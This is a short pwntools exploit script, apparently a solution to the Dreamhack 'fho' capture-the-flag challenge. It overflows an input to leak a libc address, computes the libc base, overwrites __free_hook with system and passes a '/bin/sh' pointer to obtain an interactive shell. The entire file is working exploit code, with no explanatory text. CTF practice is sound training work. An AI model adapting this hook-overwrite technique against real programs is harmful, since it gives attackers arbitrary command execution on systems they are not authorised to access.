#!/usr/bin/env python3

from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"

p = process("./fho_patched")
#p = remote("host3.dreamhack.games", 17467)
#gdb.attach(p,api=True)

#########################
# STEP_1: Leak_libcbase #
#########################

payload = b"a"*71
p.sendline(payload)

p.recvuntil(payload)
base = (int.from_bytes(p.recv(7), "little") >> 2*4) - 0x21bf7
print("[+]LIBC_BASE:",hex(base))

###################
# STEP_2: Exploit #
###################

free_hook = 0x3ed8e8 + base
system = 0x000000000004f550 + base
binsh = 0x1b3e1a + base

p.sendline(str(free_hook))
p.sendline(str(system))
p.sendline(str(binsh))


p.interactive()
